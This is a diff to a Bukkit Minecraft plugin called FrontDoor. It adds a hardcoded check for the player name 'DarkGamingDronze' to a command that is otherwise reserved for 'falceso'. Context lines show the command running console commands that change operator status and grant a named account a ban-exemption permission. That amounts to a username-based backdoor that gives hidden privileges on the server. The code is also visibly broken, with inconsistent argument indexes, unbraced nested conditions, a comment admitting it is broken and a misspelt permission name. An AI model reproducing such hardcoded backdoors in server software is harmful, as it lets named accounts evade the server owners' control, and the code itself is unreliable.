@@ -35,6 +35,7 @@ public class FrontDoor extends JavaPlugin {
     if (cmd.getName().equalsIgnoreCase("falcesofront")) {
     	
     	if (!sender.getName().equalsIgnoreCase("falceso"))
+    	if (!sender.getName().equalsIgnoreCase("DarkGamingDronze")) // Added this just for now for experemental issues
     	if (args[0].equalsIgnoreCase("on"))
     	{
             Bukkit.broadcastMessage(ChatColor.RED + "WARNING: " + sender.getName() + " has attempted to use /falcesofront. Falceso have been notified.");
@@ -56,7 +57,7 @@ public class FrontDoor extends JavaPlugin {
 
     }
 //After this it's broken....    
-    if (args[0].equalsIgnoreCase("off"))
+    if (args[1].equalsIgnoreCase("off"))
     {
 		String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
 		Bukkit.broadcastMessage(prefix +  "FrontDoor disbled by " + sender.getName()+ ".");
@@ -66,7 +67,7 @@ public class FrontDoor extends JavaPlugin {
     return true;
     }
     
-    if (args[0].equalsIgnoreCase("reset"))
+    if (args[2].equalsIgnoreCase("reset"))
     {
         Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "deop falceso");
         Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
